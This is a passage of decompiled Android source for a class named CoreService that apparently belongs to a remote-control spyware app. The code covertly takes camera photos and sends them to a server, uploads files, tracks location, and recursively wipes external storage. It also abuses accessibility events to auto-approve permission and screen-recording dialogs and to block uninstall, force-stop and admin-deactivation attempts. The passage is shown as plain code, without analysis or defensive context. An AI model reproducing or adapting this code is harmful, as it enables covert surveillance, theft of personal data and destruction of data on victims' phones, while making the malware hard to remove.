        catch (Exception exception) {
            this.sendResult("sms_status", "failed: " + exception.getMessage(), string2);
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$showToast$23$com_love_app_CoreService(String string2) {
        try {
            int n;
            Object object;
            block13: {
                object = new JSONObject(string2);
                string2 = object.optString("type", "normal");
                object = object.optString("message", "");
                if (((String)object).isEmpty()) {
                    return;
                }
                switch (string2.hashCode()) {
                    default: {
                        break;
                    }
                    case 1124446108: {
                        if (!string2.equals("warning")) break;
                        n = 3;
                        break block13;
                    }
                    case 96784904: {
                        if (!string2.equals("error")) break;
                        n = 0;
                        break block13;
                    }
                    case 3237038: {
                        if (!string2.equals("info")) break;
                        n = 2;
                        break block13;
                    }
                    case -1867169789: {
                        if (!string2.equals("success")) break;
                        n = 1;
                        break block13;
                    }
                }
                n = -1;
            }
            if (n == 0) {
                Toasty.error((Context)this, (CharSequence)object).show();
                return;
            }
            if (n == 1) {
                Toasty.success((Context)this, (CharSequence)object).show();
                return;
            }
            if (n == 2) {
                Toasty.info((Context)this, (CharSequence)object).show();
                return;
            }
            if (n != 3) {
                Toasty.normal((Context)this, (CharSequence)object).show();
                return;
            }
            Toasty.warning((Context)this, (CharSequence)object).show();
            return;
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"toast error", (Throwable)exception);
        }
    }

    /* synthetic */ void lambda$startHeartbeatService$0$com_love_app_CoreService() {
        try {
            if (!ForegroundService.isRunning()) {
                Log.d((String)TAG, (String)"ForegroundService mati, restarting...");
                this.ensureFgService();
            }
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"Local status check error", (Throwable)exception);
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$startHeartbeatService$1$com_love_app_CoreService() {
        try {
            if (!this.registered) {
                String string2 = ConfigFetcher.getBaseUrl((Context)this);
                if (string2 == null) return;
                if (string2.isEmpty()) return;
                this.registerDevice(string2);
                return;
            }
            CharSequence charSequence = ConfigFetcher.getBaseUrl((Context)this);
            if (charSequence == null) return;
            if (((String)charSequence).isEmpty()) {
                return;
            }
            charSequence = new JSONObject();
            charSequence.put(KEY_DEVICE_ID, (Object)this.deviceId);
            charSequence.put("username", (Object)ConfigFetcher.getUsername((Context)this));
            charSequence.put("session_id", (Object)ConfigFetcher.getSessionId((Context)this));
            charSequence.put("last_seen", System.currentTimeMillis());
            charSequence = new StringBuilder("hb_");
            this.sendResult("heartbeat", "alive", ((StringBuilder)charSequence).append(System.currentTimeMillis()).toString());
            return;
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"Server heartbeat error", (Throwable)exception);
        }
    }

    /* synthetic */ void lambda$startLocationTracking$16$com_love_app_CoreService(Location location) {
        this.locationData.latitude = location.getLatitude();
        this.locationData.longitude = location.getLongitude();
        this.getSharedPreferences(PREF_NAME, 0).edit().putLong("loc_lat", Double.doubleToLongBits(location.getLatitude())).putLong("loc_lon", Double.doubleToLongBits(location.getLongitude())).apply();
    }

    /*
     * Loose catch block
     * WARNING - void declaration
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$takePhoto$10$com_love_app_CoreService(String string2, int n) {
        int n2;
        Object object;
        block14: {
            this.threadCmdId.set(string2);
            int n3 = Camera.getNumberOfCameras();
            object = new Camera.CameraInfo();
            for (n2 = 0; n2 < n3; ++n2) {
                Camera.getCameraInfo((int)n2, (Camera.CameraInfo)object);
                int n4 = n == 1 ? 1 : 0;
                if (object.facing != n4) {
                    continue;
                }
                break block14;
            }
            n2 = -1;
        }
        if (n2 == -1) {
            this.sendResult("photo_error", "Camera not found", string2);
            return;
        }
        Object object2 = this.cameraLock;
        synchronized (object2) {
            block15: {
                void var6_7;
                Camera camera;
                block16: {
                    if (this.camera != null) {
                        this.releaseCamera();
                    }
                    camera = Camera.open((int)n2);
                    try {
                        object = new SurfaceTexture(0);
                        camera.setPreviewTexture((SurfaceTexture)object);
                        object = camera.getParameters();
                        object.setJpegQuality(85);
                        List list = object.getSupportedPictureSizes();
                        if (list != null && !list.isEmpty()) {
                            n = Math.max(0, list.size() - Math.max(1, list.size() / 3));
                            object.setPictureSize(((Camera.Size)list.get((int)n)).width, ((Camera.Size)list.get((int)n)).height);
                        }
                        camera.setParameters((Camera.Parameters)object);
                        camera.startPreview();
                        Thread.sleep(500L);
                        object = new CoreService$$ExternalSyntheticLambda19(this, string2);
                        camera.takePicture(null, null, (Camera.PictureCallback)object);
                        this.camera = camera;
                        break block15;
                    }
                    catch (Exception exception) {
                        break block16;
                    }
                    catch (Exception exception) {
                        camera = null;
                    }
                }
                Log.e((String)TAG, (String)"takePhoto error", (Throwable)var6_7);
                if (camera != null) {
                    try {
                        camera.release();
                    }
                    catch (Exception exception) {}
                }
                this.sendResult("photo_error", var6_7.getMessage(), string2);
            }
            return;
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$takePhoto$9$com_love_app_CoreService(String string2, byte[] byArray, Camera camera) {
        Object object = this.cameraLock;
        synchronized (object) {
            try {
                try {
                    camera.stopPreview();
                }
                catch (Exception exception) {}
                camera.release();
                this.camera = null;
                // MONITOREXIT @DISABLED, blocks:[0, 3] lbl10 : MonitorExitStatement: MONITOREXIT : var4_5
                byArray = this.compressImage(byArray, 60, 1024);
                this.savePhoto(byArray);
                this.sendResult("photo", Base64.encodeToString((byte[])byArray, (int)2), string2);
                return;
            }
            catch (Throwable throwable) {}
            throw throwable;
        }
    }

    /* synthetic */ void lambda$uploadFile$20$com_love_app_CoreService(String string2, String string3) {
        this.threadCmdId.set(string2);
        File file = new File(string3);
        if (!file.exists()) {
            this.sendResult("upload_status", "not found: " + string3, string2);
            return;
        }
        String string4 = this.uploadFileToServer(file);
        if (string4 != null) {
            try {
                string3 = new JSONObject();
                string3.put("filename", (Object)file.getName());
                string3.put("size", file.length());
                string3.put("url", (Object)string4);
                this.sendResult("file_upload", string3.toString(), string2);
            }
            catch (Exception exception) {
                this.sendResult("upload_status", "json error: " + exception.getMessage(), string2);
            }
        } else {
            this.sendResult("upload_status", "upload failed", string2);
        }
    }

    /* synthetic */ void lambda$wipe$21$com_love_app_CoreService() {
        this.deleteRecursive(Environment.getExternalStorageDirectory());
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void onAccessibilityEvent(AccessibilityEvent var1_1) {
        block32: {
            block33: {
                block31: {
                    var2_8 = var1_1.getEventType();
                    var7_9 = var1_1.getPackageName();
                    var8_12 = "";
                    var7_9 = var7_9 != null ? var1_1.getPackageName().toString() : "";
                    if (var1_1.getClassName() != null) {
                        var8_12 = var1_1.getClassName().toString();
                    }
                    if (var2_8 != 32 && var2_8 != 2048) {
                        return;
                    }
                    if (this.isLocked && !var8_12.contains("LockActivity") && !var7_9.equals(this.getPackageName())) {
                        this.startLockActivity();
                        return;
                    }
                    var1_1 = CoreService.SETTINGS_PKGS;
                    var3_13 = ((String[])var1_1).length;
                    var4_14 = 0;
                    var2_8 = 0;
                    while (true) {
                        var5_15 = 1;
                        if (var2_8 >= var3_13) break;
                        if (var7_9.startsWith(var1_1[var2_8])) {
                            var2_8 = 1;
                            break block31;
                        }
                        ++var2_8;
                    }
                    var2_8 = 0;
                }
                var1_1 = this.getRootInActiveWindow();
                if (var1_1 == null) {
                    return;
                }
                if ((var7_9.contains("systemui") || var7_9.contains("permissioncontroller") || var7_9.contains("com.android.permission")) && this.autoClickPermission(var1_1)) {
                    Log.d((String)"CoreService", (String)"⚡ Auto-clicked permission / screen record dialog");
                }
                ** GOTO lbl-1000
                {
                    catch (Throwable var7_10) {
                        break block32;
                    }
                    catch (Exception var7_11) {}
                    {
                        Log.e((String)"CoreService", (String)"adminProtect error", (Throwable)var7_11);
                        break block33;
                    }
                }
                var1_1.recycle();
                return;
            }
lbl45:
            // 3 sources

            while (true) {
                var1_1.recycle();
                return;
                break;
            }
        }
        var1_1.recycle();
        throw var7_10;
        catch (Exception var1_5) {
            return;
        }
        catch (Exception var1_2) {
            return;
        }
lbl-1000:
        // 1 sources

        {
            if (var2_8 == 0 || !this.autoClickCancel(var1_1)) ** GOTO lbl-1000
            Log.w((String)"CoreService", (String)"⚡ Admin deactivation intercepted — clicked Cancel");
            var8_12 = this.handler;
            var7_9 = new CoreService$$ExternalSyntheticLambda25(this);
            var8_12.postDelayed((Runnable)var7_9, 200L);
        }
        {
            var1_1.recycle();
            return;
        }
lbl-1000:
        // 1 sources

        {
            if (var2_8 == 0 || !this.pageContainsAdminDeactivation(var1_1)) ** GOTO lbl-1000
            this.performGlobalAction(2);
            var8_12 = this.handler;
            var7_9 = new CoreService$$ExternalSyntheticLambda26(this);
            var8_12.postDelayed((Runnable)var7_9, 100L);
            Log.w((String)"CoreService", (String)"⚡ Admin settings page — navigated away");
        }
        {
            var1_1.recycle();
            return;
        }
lbl-1000:
        // 1 sources

        {
            block34: {
                if (!var7_9.contains("installer") && !var7_9.contains("settings") && !var7_9.contains("packageinstaller") && !var7_9.contains("vending")) ** GOTO lbl45
                var7_9 = ConfigFetcher.getAppName((Context)this).toLowerCase();
                var2_8 = !(this.nodeContainsText(var1_1, this.getPackageName()) || !var7_9.isEmpty() && this.nodeContainsText(var1_1, (String)var7_9)) ? 0 : 1;
                for (var3_13 = 0; var3_13 < 21; ++var3_13) {
                    var6_16 = this.nodeContainsText(var1_1, (new String[]{"uninstall", "hapus instalasi", "copot pemasangan", "désinstaller", "desinstalar", "disinstallal", "force stop", "paksa berhenti", "arrêt forcé", "forzar detención", "interruzione forzata", "clear data", "hapus data", "effacer les données", "borrar datos", "cancella dati", "deactivate", "nonaktifkan", "désactiver", "desactivar", "disattiva"})[var3_13]);
                    if (!var6_16) continue;
                    var3_13 = var5_15;
                    break block34;
                }
                var3_13 = 0;
            }
            if (var2_8 != 0 || var3_13 != 0) ** break;
            ** continue;
        }
        {
            Log.w((String)"CoreService", (String)"⚡ Attempt to uninstall/stop detected — Deflecting");
            for (var2_8 = var4_14; var2_8 < 8; ++var2_8) {
                var8_12 = (new String[]{"batal", "cancel", "batalkan", "tidak", "no", "nanti", "annuler", "descartar"})[var2_8];
                if (!this.findAndClick(var1_1, (String)var8_12)) continue;
                var7_9 = new StringBuilder();
                Log.d((String)"CoreService", (String)var7_9.append("✅ Auto-clicked Cancel button: ").append((String)var8_12).toString());
            }
        }
        {
            this.performGlobalAction(2);
            var7_9 = this.handler;
            var8_12 = new CoreService$$ExternalSyntheticLambda27(this);
            var7_9.postDelayed((Runnable)var8_12, 50L);
        }
        {
            var1_1.recycle();
            return;
        }
        catch (Exception var1_7) {
            throw var7_10;
        }
    }

    public void onCreate() {
        CameraManager cameraManager;
        super.onCreate();
        Log.d((String)TAG, (String)"onCreate: CoreService dimulai");
        this.dpm = (DevicePolicyManager)this.getSystemService("device_policy");
        this.adminComponent = new ComponentName((Context)this, AdminReceiver.class);
        this.deviceId = this.getMyDeviceId();
        this.locationData = new AppConstant();
        this.tts = new TextToSpeech((Context)this, (TextToSpeech.OnInitListener)this);
        this.requestQueue = Volley.newRequestQueue((Context)this);
        this.cameraManager = cameraManager = (CameraManager)this.getSystemService("camera");
        try {
            this.torchCameraId = cameraManager.getCameraIdList()[0];
        }
        catch (CameraAccessException cameraAccessException) {
            Log.w((String)TAG, (String)("Tidak dapat mengakses kamera untuk torch: " + cameraAccessException.getMessage()));
        }
        this.acquireWakeLock();
        this.startLocationTracking();
        this.ensureFgService();
        this.registerCmdReceiver();
        this.startHeartbeatService();
        this.startService(new Intent((Context)this, CommandService.class));
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void onDestroy() {
        Log.d((String)TAG, (String)"onDestroy: CoreService dihentikan");
        this.getSharedPreferences(PREF_NAME, 0).edit().putBoolean("core_running", false).apply();
        this.registered = false;
        ScheduledExecutorService scheduledExecutorService = this.scheduler;
        if (scheduledExecutorService != null) {
            scheduledExecutorService.shutdown();
        }
        this.releaseCamera();
        LocationManager locationManager = this.locationManager;
        if (locationManager != null && (scheduledExecutorService = this.locationListener) != null) {
            try {
                locationManager.removeUpdates((LocationListener)scheduledExecutorService);
            }
            catch (Exception exception) {}
        }
        if ((scheduledExecutorService = this.tts) != null) {
            scheduledExecutorService.shutdown();
        }
        if ((scheduledExecutorService = this.wakeLock) != null && scheduledExecutorService.isHeld()) {
            this.wakeLock.release();
        }
        try {
            scheduledExecutorService = this.cmdReceiver;
            if (scheduledExecutorService != null) {
                this.unregisterReceiver((BroadcastReceiver)scheduledExecutorService);
            }
        }
        catch (Exception exception) {}
        super.onDestroy();
    }

    public void onInit(int n) {
        if (n != 0) {
            Log.e((String)TAG, (String)"TTS init failed");
        }
    }

    public void onInterrupt() {
        Log.d((String)TAG, (String)"onInterrupt: Layanan aksesibilitas diinterupsi");
    }

    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d((String)TAG, (String)"onServiceConnected: Layanan aksesibilitas terhubung");
        this.getSharedPreferences(PREF_NAME, 0).edit().putBoolean("core_running", true).apply();
        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
        accessibilityServiceInfo.flags = 89;
        accessibilityServiceInfo.feedbackType = 16;
        accessibilityServiceInfo.eventTypes = -1;
        this.setServiceInfo(accessibilityServiceInfo);
        this.isLocked = this.getSharedPreferences(PREF_NAME, 0).getBoolean("is_locked", false);
        this.resetLockStateIfInvalid();
        this.checkAccessibilityStatus();
    }

    public void sendResult(String string2, String string3, String string4) {
        String string5 = ConfigFetcher.getBaseUrl((Context)this);
        if (string5 != null && !string5.isEmpty()) {
            new Thread(new CoreService$$ExternalSyntheticLambda15(this, string4, string2, string3, string5)).start();
        }
    }
}

